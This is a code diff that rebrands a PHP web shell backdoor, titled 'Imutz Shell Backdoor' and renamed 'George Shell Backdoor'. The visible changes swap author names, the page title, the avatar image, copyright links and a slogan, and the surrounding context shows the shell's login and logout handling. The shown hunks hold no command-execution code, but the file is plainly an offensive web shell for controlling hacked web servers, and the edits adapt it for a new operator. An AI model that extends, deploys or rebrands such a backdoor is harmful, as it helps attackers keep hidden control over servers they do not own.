@@ -32,9 +32,9 @@ function login_shell() {
     <meta charset="utf-8">
 		<meta name='viewport' content='widht=device-widht, initial-scale=0.75'>
 		<link rel='icon' type='image/png' href='https://avatars3.githubusercontent.com/u/53482167?s=460&v=4'/>
-		<meta name='author' content='Szt00Xploit'/>
-		<meta name='author' content='Szt00Xploit'/>
-		<meta name='copyright' content='Szt00Xploit'/>
+		<meta name='author' content='George'/>
+		<meta name='author' content='George'/>
+		<meta name='copyright' content='George'/>
 		<meta name='description' content='Imutz Shell Backdoor'>
 		<meta name="theme-color" content="#000">
 
@@ -42,7 +42,7 @@ function login_shell() {
     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
     <link href="https://fonts.googleapis.com/css?family=Rock Salt|Righteous" rel="stylesheet">
 
-    <title>Szt00Xploit Shell Backdoor</title>
+    <title>George Shell Backdoor</title>
     <style>
     	body{
     		background-color:black;
@@ -61,8 +61,8 @@ function login_shell() {
   </head>
   <body class="text-white">
     <div class="p-3">
-    	<h2 class="text-center">Szt00Xploit</h2><hr>
-    	<img src="https://i.ibb.co/gPyMhkz/avatar-1001966631916.jpg" class="mx-auto d-block"><hr>
+    	<h2 class="text-center">George Shell</h2><hr>
+    	<img src="https://i.postimg.cc/g2KTsc6m/george.gif" class="mx-auto d-block"><hr>
     		<form method="post">
     	<div class="row">
     		<div class="col">
@@ -74,7 +74,7 @@ function login_shell() {
     	</div></form>
     	<hr>
     	<center>
-    		<small>Copyright &copy; <a href="https://t.me/sztsss">Szt00Xploit</a></small>
+    		<small>Copyright &copy; <a href="#">George</a></small>
     	</center>
     </div>
 
@@ -256,8 +256,8 @@ echo "
 		<meta name='viewport' content='widht=device-widht, initial-scale=0.75'>
 		<link rel='icon' type='image/png' href='https://avatars3.githubusercontent.com/u/53482167?s=460&v=4'/>
 		<meta name='author' content='CodeXploit+Holiq'/>
-		<meta name='copyright' content='22XploiterCrew'/>
-		<meta name='description' content='Imutz Shell Backdoor'>
+		<meta name='copyright' content='George Shell'/>
+		<meta name='description' content='George Shell Backdoor'>
                 <meta name='theme-color' content='#000'>
 		<link rel='stylesheet' href='https://stackpath.bootstrapcdn.com/bootstrap/4.3.0/css/bootstrap.min.css'>
 		<link rel='stylesheet' href='https://use.fontawesome.com/releases/v5.7.2/css/all.css' >
@@ -431,8 +431,8 @@ echo "
 			</div>
 		</nav>
 		<div class=''>
-			<h1 class='text-center'><a href='https://t.me/sztsss'>[+]Szt00Xploit Xploiter[+]</h1>
-			<center><p>Free Palestine No Genosida</a></p></center>
+			<h1 class='text-center'><a href='https://t.me/sztsss'>[+]George Xploiter[+]</h1>
+			<center><p>Too much self-confidence makes you forget yourself</a></p></center>
 			<hr/>";
 		//keluar
 		if (isset($_GET['keluar'])) {
